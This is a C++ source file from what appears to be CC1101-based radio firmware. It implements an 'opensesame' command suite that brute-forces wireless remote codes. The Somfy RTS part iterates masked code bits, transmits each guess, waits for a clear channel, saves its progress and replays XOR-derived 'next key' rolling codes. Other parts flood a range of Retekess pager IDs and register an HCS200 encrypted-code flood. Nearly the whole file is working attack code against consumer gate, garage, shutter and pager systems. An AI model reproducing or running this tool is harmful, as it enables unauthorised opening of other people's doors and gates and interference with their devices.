//------------------------------------------------------------------------------------------------------------------
#include "settings.h"
#include "Processor.h"
#include "Protocol.h"
#include "ev1527_protocol.h"
#include "hcs200_protocol.h"
#include "somfy_protocol.h"
//------------------------------------------------------------------------------------------------------------------
#include "CmdHandler.h"
#include "radio_profile.h"
#include "radio_pulses.h"
#include "utils.h"
#if USE_FILE_SYSTEM == 1
#include "LittleFS.h"
#include "files.h"
#endif
//------------------------------------------------------------------------------------------------------------------
#include "env.h"
//------------------------------------------------------------------------------------------------------------------
#include "OS_HCS200.h"
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_main(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_help(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_setcode(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_setmask(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_setirange(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_setibds(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_setirangea(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_setcurr(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_setcurrf(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_cont(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_smaxt(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_srssi(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_nextkey(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_nextkeya(void* parent,int argc, char* argv[]);
//------------------------------------------------------------------------------------------------------------------
CmdHandler* getRootCommandHandler(void);

//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_retk(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_retk_help(void* parent,int argc, char* argv[]);
//------------------------------------------------------------------------------------------------------------------
CC1101* getRadio(void);
#if USE_FILE_SYSTEM == 1
CmdStatus_e files_write_int(void* parent, const char *fname, const char* buffer, const char* openmode);
CmdStatus_e files_readenv(void* parent,int argc, char* argv[]);
#endif
//------------------------------------------------------------------------------------------------------------------
extern SomfyRTSProtocol somfy;
extern RetekessProtocol retk;
extern HCS200Protocol hcs200;
Protocol* osprots[] = { &somfy, &retk, &hcs200 };
//------------------------------------------------------------------------------------------------------------------
typedef struct SomfyBruteContext_s
{
    uint32_t c0,c1,c2;
    uint32_t c0msk,c1msk,c2msk;
    uint64_t itstart;
    uint64_t itend;
    uint64_t curr;
    uint8_t bit_spread_strategy;
    int max_time;
    bool cont;
    bool use_rssi;
    int rssi;
    int rssi_wait_ms;

} SomfyBruteContext_t;
//------------------------------------------------------------------------------------------------------------------
SomfyBruteContext_t somfy_ctx;
uint32_t next_key_xor_table[13] = { 0x00000000, 0x00018180, 0x00028280, 0x00048480, 0x00088880, 0x00090900, 0x00050500, 0x000F0F00, 0x000E8E80, 0x000C0C00, 0x00060600, 0x00078780, 0x00030300 };
//------------------------------------------------------------------------------------------------------------------
cmd_handler_t open_sesame_handler = { &open_sesame_main, NULL, NULL, "opensesame", "Open sesame for various radio protocols, use: 'opensesame help'", 0, "", "opensesame help" };
//------------------------------------------------------------------------------------------------------------------
cmd_handler_t open_sesame_sub_cmd[] = {
   { &open_sesame_main,      &open_sesame_handler,   NULL, "help",  "this help", 0, "", "opensesame help"},
   { &open_sesame_somfy,     &open_sesame_handler,   NULL, "somfy",  "somfy iterated frames flood", 0, "", "opensesame somfy help"},
   { &open_sesame_retk,      &open_sesame_handler,   NULL, "retekess",  "retekes iterated id flood", 0, "", "opensesame retekes help"},
   { &open_sesame_hcs200,    &open_sesame_handler,   NULL, "hcs200",  "hcs200 iterated enccode flood", 0, "", "opensesame hcs200 help"},
   { 0,  0, NULL, "",  "", 0, "","" }
};
//------------------------------------------------------------------------------------------------------------------
cmd_handler_t open_sesame_somfy_sub_cmd[] = {
   { &open_sesame_somfy_help,      &open_sesame_handler, NULL, "help", "this help", 0, "", "opensesame somfy help"},
   { &open_sesame_somfy_setcode,   &open_sesame_handler, NULL, "scod", "set codes c0<32bit hex> c1<32bit hex> c2<432bit hex>", 3, "xxx", "opensesame somfy scod 09800000 00000000 ffea8000"},
   { &open_sesame_somfy_setmask,   &open_sesame_handler, NULL, "smsk", "set iteration mask c0msk<hex> c1msk<hex> c2msk<hex>", 3, "xxx", "opensesame somfy smsk 007FFFFF FFFFFFFF 00070000"},
   { &open_sesame_somfy_setirange, &open_sesame_handler, NULL, "sir",  "set iteration range start_hi<hex> start_lo<hex> end_hi<hex> end_lo<hex>", 4, "xxxx", "opensesame somfy sir 00000000 00000000 FFFFFFFF FFFFFFFF"},
   { &open_sesame_somfy_setirangea, &open_sesame_handler, NULL, "sira",  "set auto iteration, set mask first", 0, "", "opensesame somfy sira"},
   { &open_sesame_somfy_setcurr, &open_sesame_handler, NULL, "sirs",  "set current iteration value, set mask first, curr_hi<hex> curr_lo<hex>", 2, "xx", "opensesame somfy sirs 0x00000000 0x0000ffff"},
   #if USE_FILE_SYSTEM == 1
   { &open_sesame_somfy_setcurrf, &open_sesame_handler, NULL, "sirf",  "set current iteration from file, set mask first, filename<txt>", 1, "t", "opensesame somfy sirf os_somfy.txt"},
   #endif
   { &open_sesame_somfy_setibds,   &open_sesame_handler, NULL, "sibds", "set iteration bit dispersion strategy: 0 - none, 1 - assymetric, 2 - quad-asssymetric", 1, "i", "opensesame somfy sibds 1"},
   { &open_sesame_somfy_smaxt,     &open_sesame_handler, NULL, "smaxt", "set max opration time in seconds: time<int>", 1, "i", "opensesame somfy smaxt 3600 <int>"},
   { &open_sesame_somfy_srssi,     &open_sesame_handler, NULL, "srssi", "set min rssi for channel monitoring: rssi<signed int> use<int> 0 - 1, wait millis <int>", 3, "isi", "opensesame somfy srrsi 1<int> -60 <int> 2000<int>"},
   { &open_sesame_somfy_process  , &open_sesame_handler, NULL, "brute", "brute iteration of codes, display interval<int>", 1, "i", "opensesame somfy brute 10000<int ms>"},   
   { &open_sesame_somfy_cont     , &open_sesame_handler, NULL, "brutc", "set continuation flag<int> 0-1, ", 1, "i", "opensesame somfy brutc 1<int>"},
   { &open_sesame_somfy_nextkey  , &open_sesame_handler, NULL, "nkey", "transmit next key offset<int>1-6, rpetitions<int> ", 2, "ii", "opensesame somfy nkey 1<int> 2<int>"},
   { &open_sesame_somfy_nextkeya , &open_sesame_handler, NULL, "nkeya", "transmit few next keys, rpetitions<int> ", 1, "i", "opensesame somfy nkeya 2<int>"},
   { 0,  0, NULL, "",  "", 0, "","" }
};
//------------------------------------------------------------------------------------------------------------------
cmd_handler_t open_sesame_retk_sub_cmd[] = {
  { &open_sesame_retk_help,      &open_sesame_handler, NULL, "help", "this help", 0, "", "opensesame retekess help" },
  { &open_sesame_retk_process  , &open_sesame_handler, NULL, "brute", "brute iteration of codes, id1<hex>, id2_start<hex, id2_end<hedx> >display interval<int>", 4, "xxxi", "opensesame retekess brute 032 001 fff 10000<int ms>"},   
  { 0,  0, NULL, "",  "", 0, "","" }  
};
//------------------------------------------------------------------------------------------------------------------
void opensesame_cmd_init(void)
{ 
  open_sesame_sub_cmd[1].sub_cmd = open_sesame_somfy_sub_cmd;
  open_sesame_sub_cmd[2].sub_cmd = open_sesame_retk_sub_cmd;
  open_sesame_sub_cmd[3].sub_cmd = open_sesame_hcs200_sub_cmd;
  getRootCommandHandler()->registerHandler(&open_sesame_handler, open_sesame_sub_cmd); 
  somfy_ctx.c0 = 0x09800000;
  somfy_ctx.c1 = 0x00000000;
  somfy_ctx.c1 = 0xffea8000;
  somfy_ctx.cont = false;
  somfy_ctx.use_rssi = false;
  somfy_ctx.max_time = 0;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_main(void* parent,int argc, char* argv[])
{
     STDOUT.println(open_sesame_handler.desc);

     int idx = 0 ;
     cmd_handler_t* item = &open_sesame_handler.sub_cmd[idx];
     while (item && item->handler != 0)
     {
            STDOUT.print("- ");
            STDOUT.print(item->cmd);
            STDOUT.print( " : ");
            STDOUT.println( item->desc);

            idx++;
            item = &open_sesame_handler.sub_cmd[idx];
      
     }
    
     return OK;
}

//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy(void* parent,int argc, char* argv[])
{
     int idx = 0 ;
     cmd_handler_t* item = &open_sesame_somfy_sub_cmd[idx];

     if (argc < 3)
        return open_sesame_somfy_help(parent, argc, argv);
     
     while (item && item->handler != 0)
     {
            if (String(argv[2]) == item->cmd)
            {
                return item->handler(getRootCommandHandler(), argc, argv);
            }
            idx++;
            item = &open_sesame_somfy_sub_cmd[idx];
      
     }
    
     return COMMAND_NOT_FOUND;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_retk(void* parent,int argc, char* argv[])
{
     int idx = 0 ;
     cmd_handler_t* item = &open_sesame_retk_sub_cmd[idx];

     if (argc < 3)
        return open_sesame_retk_help(parent, argc, argv);
     
     while (item && item->handler != 0)
     {
            if (String(argv[2]) == item->cmd)
            {
                return item->handler(getRootCommandHandler(), argc, argv);
            }
            idx++;
            item = &open_sesame_retk_sub_cmd[idx];
      
     }
    
     return COMMAND_NOT_FOUND;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_help(void* parent,int argc, char* argv[])
{
     STDOUT.println(open_sesame_sub_cmd[1].desc);

     int idx = 0 ;
     cmd_handler_t* item = &open_sesame_somfy_sub_cmd[idx];
     while (item && item->handler != 0)
     {
            STDOUT.print("- ");
            STDOUT.print(item->cmd);
            STDOUT.print( " : ");
            STDOUT.println( item->desc);

            idx++;
            item = &open_sesame_somfy_sub_cmd[idx];
      
     }
    
     return OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_retk_help(void* parent,int argc, char* argv[])
{
     STDOUT.println(open_sesame_sub_cmd[2].desc);

     int idx = 0 ;
     cmd_handler_t* item = &open_sesame_retk_sub_cmd[idx];
     while (item && item->handler != 0)
     {
            STDOUT.print("- ");
            STDOUT.print(item->cmd);
            STDOUT.print( " : ");
            STDOUT.println( item->desc);

            idx++;
            item = &open_sesame_retk_sub_cmd[idx];
      
     }
    
     return OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_setcode(void* parent,int argc, char* argv[])
{
   uint32_t c0 = strtoul(argv[3], 0, 16);
   uint32_t c1 = strtoul(argv[4], 0, 16);      
   uint32_t c2 = strtoul(argv[5], 0, 16);    
   
   somfy_ctx.c0 = c0;
   somfy_ctx.c1 = c1;
   somfy_ctx.c2 = c2;
   somfy_ctx.use_rssi = false;

   if (c0 == 0 || c2 == 0)
       return WRONG_PARAMS;
   
   return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_setmask(void* parent,int argc, char* argv[])
{
   uint32_t code0msk = strtoul(argv[3], 0, 16);
   uint32_t code1msk = strtoul(argv[4], 0, 16);      
   uint32_t code2msk = strtoul(argv[5], 0, 16);
   
   somfy_ctx.c0msk = code0msk;
   somfy_ctx.c1msk = code1msk;
   somfy_ctx.c2msk = code2msk;
    
   return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_setirange(void* parent,int argc, char* argv[])
{
   uint32_t v1 = strtoul(argv[3], 0, 16);
   uint32_t v2 = strtoul(argv[4], 0, 16);   
   uint32_t v3 = strtoul(argv[5], 0, 16);
   uint32_t v4 = strtoul(argv[6], 0, 16);  
   
   somfy_ctx.itstart = v1;
   somfy_ctx.itstart |= (uint64_t)((uint64_t)v2 << 32); 
   somfy_ctx.itend =  v3;
   somfy_ctx.itend |= (uint64_t)((uint64_t)v4 << 32);
   
   return CmdStatus_e::OK;
}

//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_setcurr(void* parent,int argc, char* argv[])
{
   uint32_t h = strtoul(argv[3], 0, 16);
   uint32_t l = strtoul(argv[4], 0, 16); 
   
   somfy_ctx.curr = l;
   somfy_ctx.curr |= (uint64_t)((uint64_t)h << 32);
   
   return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
#if USE_FILE_SYSTEM == 1
CmdStatus_e open_sesame_somfy_setcurrf(void* parent,int argc, char* argv[])
{

   char path[32];
   uint32_t l, h = 0 ;
   
   sprintf(path, "/%s", argv[3]);
   if (LittleFS.exists(path))
   {
      File f = LittleFS.open(path, "r");
      if (f)
      {
          String s1 = f.readStringUntil(' ');
          String s2 = f.readStringUntil('\n');
          if (s1[s1.length() -1] == ' ')
              s1 = s1.substring(0, s1.length());
          if (s2[s2.length() -1] == '\n')
              s2 = s2.substring(0, s2.length());   
          if (s2[s2.length() -1] == '\r')
              s2 = s2.substring(0, s2.length());    
                  
          h = strtoul(s1.c_str(), 0, 16);
          l = strtoul(s2.c_str(), 0, 16);
          f.close();
      } else {
        l = 0;
        h = 0;
      }
   }
    
   somfy_ctx.curr = l;
   somfy_ctx.curr |= (uint64_t)((uint64_t)h << 32);
   
   return CmdStatus_e::OK;
}
#endif
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_setibds(void* parent,int argc, char* argv[])
{
  int strategy = atoi(argv[3]);
  if (strategy < 0 || strategy > 2)
     return WRONG_PARAMS;

  somfy_ctx.bit_spread_strategy = strategy;
  return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_smaxt(void* parent,int argc, char* argv[])
{
  int maxt = atoi(argv[3]);
  if (maxt < 0 || maxt > 12 * 3600)
  {
     CmdHandler* handler = (CmdHandler*) parent;
     handler->setHint("wrong max time: 0 - 43200 seconds (12h)");
     return WRONG_PARAMS;
  }

  somfy_ctx.max_time = maxt;
  return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_setirangea(void* parent,int argc, char* argv[])
{

   if (somfy_ctx.c0msk ==0 && somfy_ctx.c1msk == 0 && somfy_ctx.c2msk == 0)
   {
       CmdHandler* handler = (CmdHandler*) parent;
       handler->setHint("Set iteration mask first , smsk");
       return WRONG_PARAMS;
   }

   uint32_t cnt = count_bits_set_uint32(somfy_ctx.c0msk);
   cnt += count_bits_set_uint32(somfy_ctx.c1msk);
   cnt += count_bits_set_uint32(somfy_ctx.c2msk);
   
   somfy_ctx.itstart = 0;
    
   somfy_ctx.itend =  bitscount_to_max_uint64(cnt);
   
   return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
String open_sesame_somfy_ctx_describe(uint32_t c0, uint32_t c1, uint32_t c2, struct SomfyBruteContext_s& ctx, uint32_t startMs)
{
     char buffer[128];
     int progress = ((100 * ctx.curr)/ ctx.itend);
     sprintf(buffer, "cnt:%08x%08x c0: %08x c1: %08x c2: %08x ts:%s prog: %d", 
        (uint32_t)(ctx.curr >> 32) & 0xffffffff, (uint32_t)(ctx.curr) & 0xffffffff,
        c0, c1, c2, millis_to_time(millis() - startMs).c_str(), progress);

     return String(buffer);
    
}
//------------------------------------------------------------------------------------------------------------------
String open_sesame_retk_describe(uint32_t id1, uint32_t id2s, uint32_t id2e, uint32_t id2curr, uint32_t startMs)
{
     char buffer[128];
     int progress = ((100 * id2curr)/ id2e);
     sprintf(buffer, "cnt:%04x%03x id1: %04x id2: %03x ts:%s prog: %d", 
        (uint32_t)(id1) & 0x1fff, (uint32_t)(id2curr) & 0xfff,
        id1, id2curr, millis_to_time(millis() - startMs).c_str(), progress);

     return String(buffer);
    
}
 //------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_srssi(void* parent,int argc, char* argv[])
{
    int use_rssi = atoi(argv[3]);
    
    int rssi = atoi(argv[4]);

    int wait_rssi = atoi(argv[5]);
    
    if (use_rssi < 0  || use_rssi > 1)
    {
         getRootCommandHandler()->setResultMessage("wrong use rssi");
         return WRONG_PARAMS;
    }
    if (rssi < -100 || rssi > 100)
    {
        getRootCommandHandler()->setResultMessage("wrong rssi <-100,100>");
        return WRONG_PARAMS;
    }

    if (wait_rssi < 0 || wait_rssi > 10000)
    {
        getRootCommandHandler()->setResultMessage("wrong time after channel occupied");
        return WRONG_PARAMS;
    }

        
   somfy_ctx.use_rssi = use_rssi ? true : false;
   somfy_ctx.rssi = rssi;
   somfy_ctx.rssi_wait_ms = wait_rssi;

   return OK;
}   
//------------------------------------------------------------------------------------------------------------------
void open_sesame_somfy_store_file_counter(uint64_t val)
{
    char buf[20];
    uint32_t h = (val >> 32) & 0xffffffff;
    uint32_t l = (val & 0xffffffff);
    sprintf(buf, "%08x %08x", (uint32_t)(h), (uint32_t)(l));
    file_write("/os_somfy.txt", buf, strlen(buf));
}
//------------------------------------------------------------------------------------------------------------------
void open_sesame_somfy_store_env_counter(uint64_t val)
{
    char buf[20];
    uint32_t h = (val >> 32) & 0xffffffff;
    uint32_t l = (val & 0xffffffff);
    sprintf(buf, "%08x", (uint32_t)(h));
    env_set("sirsh", buf);
    sprintf(buf, "%08x",(uint32_t)(l));
    env_set("sirsl", buf);
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[])
{
    uint32_t disp = atoi(argv[3]);
    bool cont = true;
    String msg;
    uint32_t c0;
    uint32_t c1;
    uint32_t c2;
    int pulses;
    int p;
    int opsec;
    
    if (disp == 0 || disp < 2000 || disp > 360000)
    {
         getRootCommandHandler()->setResultMessage("wrong display period");
         return WRONG_PARAMS;
    }
    
    if (somfy_ctx.c0 == 0 || somfy_ctx.c2 == 0)
    {
         getRootCommandHandler()->setResultMessage("check c0, c2 codes");
         return WRONG_PARAMS;
    }
    if (somfy_ctx.itend <= somfy_ctx.itstart)
    {
         getRootCommandHandler()->setResultMessage("wrong start end range");
         return WRONG_PARAMS;
    }
    if (somfy_ctx.c0msk == 0 && somfy_ctx.c1msk == 0 && somfy_ctx.c2msk ==0)
    {
         getRootCommandHandler()->setResultMessage("wrong mask for code1,code2,code3");
         return WRONG_PARAMS;
    } 
    
    STDOUT.print("brute start\n\r");
    STDOUT.print("proto:");
    STDOUT.print(somfy.getName().c_str());
    STDOUT.print(" c0:");print_hex_uint32(STDOUT, somfy_ctx.c0);
    STDOUT.print(" c1:");print_hex_uint32(STDOUT, somfy_ctx.c1);
    STDOUT.print(" c2:");print_hex_uint32(STDOUT, somfy_ctx.c2);
    STDOUT.print("\n\r");
    STDOUT.print(" code1msk:");print_hex_uint32(STDOUT, somfy_ctx.c0msk);
    STDOUT.print(" code2msk:");print_hex_uint32(STDOUT, somfy_ctx.c1msk);
    STDOUT.print(" code3msk:");print_hex_uint32(STDOUT, somfy_ctx.c2msk);
    STDOUT.print("\n\r");
    STDOUT.print(" start:");print_hex_uint64(STDOUT, somfy_ctx.itstart); 
    STDOUT.print(" end:");print_hex_uint64(STDOUT, somfy_ctx.itend);
    STDOUT.print(" curr:");print_hex_uint64(STDOUT, somfy_ctx.curr); 
    STDOUT.print("\n\r");
    STDOUT.println(" press ctrl-c/f/d to terminate...");


    if (!somfy_ctx.cont)
    {
        somfy_ctx.curr = somfy_ctx.itstart;
    }
    else
        somfy_ctx.cont = false;

    uint32_t startMs = millis();
    uint32_t s = startMs;
    
    uint32_t bitLen = count_bits_set_uint32(somfy_ctx.c0msk);
    bitLen += count_bits_set_uint32(somfy_ctx.c1msk);
    bitLen += count_bits_set_uint32(somfy_ctx.c2msk);
    
    while(somfy_ctx.curr <= somfy_ctx.itend && cont)
    {
       c0 = somfy_ctx.c0;
       c1 = somfy_ctx.c1;
       c2 = somfy_ctx.c2;

       uint64_t v;

       if (somfy_ctx.bit_spread_strategy == 0)
           v = somfy_ctx.curr;
       else if (somfy_ctx.bit_spread_strategy == 1)
           v = bit_spread_assymetric(somfy_ctx.curr, bitLen);          
       else if (somfy_ctx.bit_spread_strategy == 2)
           v = bit_spread_quad_assymetric(somfy_ctx.curr, bitLen);
           
       apply_value_to_bitmask(&c0, &c1, &c2, somfy_ctx.c0msk,somfy_ctx.c1msk,somfy_ctx.c2msk, v);
       
       somfy.setCodes(c0, c1, c2);

       radio_pulses_flush();


       pulses = 0;
       somfy.toPulses(radio_pulses_get_pulses(), radio_pulses_max_count(), &p, 0);       
       pulses += p;
       somfy.toPulses(&radio_pulses_get_pulses()[pulses], radio_pulses_max_count() - pulses, &p, 1);
       pulses += p;

       if(somfy_ctx.use_rssi)
       {
          bool printMark = false;
          uint32_t rs = millis();
          
          while (getRadio()->getRSSI() >= somfy_ctx.rssi && millis() -rs < somfy_ctx.rssi_wait_ms)
          {
             if(!printMark)
             {    
                  printMark = true;
                  STDOUT.print("wait clear channel\n\r");
             }
             delayMicroseconds(1000 * somfy_ctx.rssi_wait_ms);
          }
       }
       
       radio_pulses_send(0, pulses);
       
       if (millis() -s > disp)
       {
           msg = "brut tx:" + open_sesame_somfy_ctx_describe(c0,c1,c2,somfy_ctx, startMs);
           STDOUT.print(msg); STDOUT.print("\n\r");
           s = millis();
       }

       somfy_ctx.curr++;
       #if USE_FILE_SYSTEM == 1
       if (somfy_ctx.curr  > 0 && (somfy_ctx.curr % OS_ITERATION_FILE_AUTO_DUMP == 0))
           open_sesame_somfy_store_env_counter(somfy_ctx.curr);
       if (somfy_ctx.curr  > 0 && (somfy_ctx.curr % (4 * OS_ITERATION_FILE_AUTO_DUMP) == 0))
           open_sesame_somfy_store_file_counter(somfy_ctx.curr);
       #endif

       opsec = (millis() - startMs) / 1000;

       if (somfy_ctx.max_time > 0 && opsec > somfy_ctx.max_time)
           cont = false;
          
       if (STDIN.available() > 0 && cont)
       {
          byte c = STDIN.read();
          
          if (c == CTRL_C || c == CTRL_F || c == CTRL_D)
          {
              cont = false;
              continue;
          }
       }
    }
    #if USE_FILE_SYSTEM == 1
    //store last counter
    open_sesame_somfy_store_env_counter(somfy_ctx.curr);
    open_sesame_somfy_store_file_counter(somfy_ctx.curr);
    #endif
    msg = "brut last tx:" + open_sesame_somfy_ctx_describe(c0,c1,c2,somfy_ctx, startMs);
    STDOUT.print(msg); STDOUT.print("\n\r");
    STDOUT.print("brute stop\n\r");
    

    return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_cont(void* parent,int argc, char* argv[])
{
   int cont = atoi(argv[3]);
   
   if (cont < 0 || cont > 1)
   {
       getRootCommandHandler()->setResultMessage("wrong continuation flag: 0 - 1");
       return WRONG_PARAMS;
   }
  
   somfy_ctx.cont = cont ? true : false;

   return OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_nextkey(void* parent,int argc, char* argv[])
{
   int koff = atoi(argv[3]);
   int rep = atoi(argv[4]);
   int pulses;  
   int p;
   
   if (koff < 0 || koff > 6)
   {
       getRootCommandHandler()->setResultMessage("wrong key offset: 0 - 6");
       return WRONG_PARAMS;
   }
   if (rep < 0 || rep > 13)
   {
       getRootCommandHandler()->setResultMessage("wrong repetition count: 0 - 13");
       return WRONG_PARAMS;
   }

    if (somfy_ctx.c0 == 0 || somfy_ctx.c1 == 0 || somfy_ctx.c2 == 0)
    {
         getRootCommandHandler()->setResultMessage("check c0 - c2 codes, use scod");
         return WRONG_PARAMS;
    }
    uint32_t c0 = somfy_ctx.c0 ^ next_key_xor_table[koff];

    STDOUT.print("next key\n\r");
    STDOUT.print("proto:");
    STDOUT.print(somfy.getName().c_str());
    STDOUT.print(" c0:");print_hex_uint32(STDOUT, somfy_ctx.c0);
    STDOUT.print(" c1:");print_hex_uint32(STDOUT, somfy_ctx.c1);
    STDOUT.print(" c2:");print_hex_uint32(STDOUT, somfy_ctx.c2);
    STDOUT.print("\n\r");
    STDOUT.print("target key:");
    STDOUT.print(" c0:");print_hex_uint32(STDOUT, c0);
    STDOUT.print(" c1:");print_hex_uint32(STDOUT, somfy_ctx.c1);
    STDOUT.print(" c2:");print_hex_uint32(STDOUT, somfy_ctx.c2);
    STDOUT.print("\n\r");
    STDOUT.print("--repeating ");
    STDOUT.print(rep);
    STDOUT.print(" times\n\r");
    somfy.setCodes(c0, somfy_ctx.c1, somfy_ctx.c2);
    radio_pulses_flush();
    pulses = 0;
    
    for (int r = 0; r < rep; r++)
    {
       somfy.toPulses(radio_pulses_get_pulses(), radio_pulses_max_count(), &p, r);       
       pulses += p;
    }
    radio_pulses_send(0, pulses);
    
   return OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_nextkeya(void* parent,int argc, char* argv[])
{
   int rep = atoi(argv[3]);
   int pulses;  
   int p;
   
   if (rep < 0 || rep > 12)
   {
       getRootCommandHandler()->setResultMessage("wrong repetition count: 0 - 12");
       return WRONG_PARAMS;
   }

    if (somfy_ctx.c0 == 0 || somfy_ctx.c1 == 0 || somfy_ctx.c2 == 0)
    {
         getRootCommandHandler()->setResultMessage("check c0 - c2 codes, use scod");
         return WRONG_PARAMS;
    }
   

    STDOUT.print("next key\n\r");
    STDOUT.print("proto:");
    STDOUT.print(somfy.getName().c_str());
    STDOUT.print(" c0:");print_hex_uint32(STDOUT, somfy_ctx.c0);
    STDOUT.print(" c1:");print_hex_uint32(STDOUT, somfy_ctx.c1);
    STDOUT.print(" c2:");print_hex_uint32(STDOUT, somfy_ctx.c2);
    STDOUT.print("\n\r");


    for (int koff = 1; koff < 13; koff++)
    {
        uint32_t c0 = somfy_ctx.c0 ^ next_key_xor_table[koff];
        somfy.setCodes(c0, somfy_ctx.c1, somfy_ctx.c2);
        radio_pulses_flush();
        pulses = 0;

        STDOUT.print("target key[");STDOUT.print(koff);STDOUT.print("]");
        STDOUT.print(" c0:");print_hex_uint32(STDOUT, c0);
        STDOUT.print(" c1:");print_hex_uint32(STDOUT, somfy_ctx.c1);
        STDOUT.print(" c2:");print_hex_uint32(STDOUT, somfy_ctx.c2);
        STDOUT.print(" -rep ");
        STDOUT.print(rep);
        STDOUT.print(" times\n\r");

        
        for (int r = 0; r < rep; r++)
        {
           somfy.toPulses(radio_pulses_get_pulses(), radio_pulses_max_count(), &p, r);       
           pulses += p;
        }
        radio_pulses_send(0, pulses);
        delayMicroseconds(4 * somfy.getInterFrameTime());
    }
    
   return OK;
}

//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_retk_process(void* parent,int argc, char* argv[])
{

   uint32_t id1 = strtoul(argv[3], 0, 16);
   uint32_t id2s = strtoul(argv[4], 0, 16);      
   uint32_t id2e = strtoul(argv[5], 0, 16);    
   uint32_t disp = atoi(argv[6]);
   uint32_t curr;
     
    
    bool cont = true;
    String msg;
    int pulses;
    int p;
    int opsec;


    if (id1 == 0 || id2e == 0)
       return WRONG_PARAMS;

    if (id2e < id2s)
       return WRONG_PARAMS;
    
    if (disp == 0 || disp < 2000 || disp > 360000)
    {
         getRootCommandHandler()->setResultMessage("wrong display period");
         return WRONG_PARAMS;
    }
    
    
    STDOUT.print("brute start\n\r");
    STDOUT.print("proto:");
    STDOUT.print(retk.getName().c_str());
    STDOUT.print(" id1:");print_hex_uint32(STDOUT, id1);
    STDOUT.print(" id2 start:");print_hex_uint32(STDOUT, id2s);
    STDOUT.print(" id2 end:") ;print_hex_uint32(STDOUT, id2e);
    STDOUT.print("\n\r");
    STDOUT.println(" press ctrl-c/f/d to terminate...");

    uint32_t startMs = millis();
    uint32_t s = startMs;
    

    curr = id2s;
    
    while(curr <= id2e && cont)
    {
       uint64_t v;
       
       retk.setData(id1 << 12 | curr);

       radio_pulses_flush();


       pulses = 0;
       retk.toPulses(radio_pulses_get_pulses(), radio_pulses_max_count(), &p, 0);       
       pulses += p;
       retk.toPulses(&radio_pulses_get_pulses()[pulses], radio_pulses_max_count() - pulses, &p, 1);
       pulses += p;
       
       radio_pulses_send(0, pulses);
       
       if (millis() -s > disp)
       {
           msg = "brut tx:" + open_sesame_retk_describe(id1, id2s, id2e, curr, startMs);
           STDOUT.print(msg); STDOUT.print("\n\r");
           s = millis();
       }

       curr++;

       opsec = (millis() - startMs) / 1000;
          
       if (STDIN.available() > 0 && cont)
       {
          byte c = STDIN.read();
          
          if (c == CTRL_C || c == CTRL_F || c == CTRL_D)
          {
              cont = false;
              continue;
          }
       }
    }
    msg = "brut last tx:" + open_sesame_retk_describe(id1,id2s,id2e,curr, startMs);
    STDOUT.print(msg); STDOUT.print("\n\r");
    STDOUT.print("brute stop\n\r");
    

    return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
